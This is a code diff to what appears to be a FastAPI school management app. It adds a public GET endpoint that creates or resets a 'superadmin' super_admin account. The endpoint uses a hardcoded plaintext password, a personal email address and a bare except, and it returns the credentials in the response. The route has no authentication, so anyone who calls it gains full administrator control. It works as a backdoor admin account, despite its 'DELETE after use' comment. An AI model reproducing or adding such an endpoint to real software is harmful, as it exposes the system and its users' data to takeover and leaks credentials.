@@ -72,6 +72,26 @@ from app.routes.v1.alumni import router as r39; app.include_router(r39)
 from app.routes.v1.super_admin import router as super_admin_router
 app.include_router(super_admin_router)
 
+
+@app.get("/setup-super-admin")
+def setup_super_admin():
+    """One-time super admin setup - DELETE after use"""
+    import sqlite3, bcrypt
+    conn = sqlite3.connect('database/school.db')
+    password = "HermanKing2026!"
+    password_hash = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')
+    try:
+        conn.execute("INSERT INTO users (id, username, email, password_hash, full_name, role, is_active, first_login) VALUES (999, 'superadmin', 'jaingsalim@gmail.com', ?, 'Programmer Herman', 'super_admin', 1, 0)", (password_hash,))
+        conn.commit()
+        result = "Super Admin created!"
+    except:
+        conn.execute("UPDATE users SET password_hash = ? WHERE username = 'superadmin'", (password_hash,))
+        conn.commit()
+        result = "Super Admin password updated!"
+    conn.close()
+    return {"success": True, "message": result, "username": "superadmin", "password": "HermanKing2026!"}
+
+
 @app.get("/health", tags=["System"])
 def health():
     status = {"status": "healthy", "timestamp": datetime.utcnow().isoformat(), "version": settings.APP_VERSION}
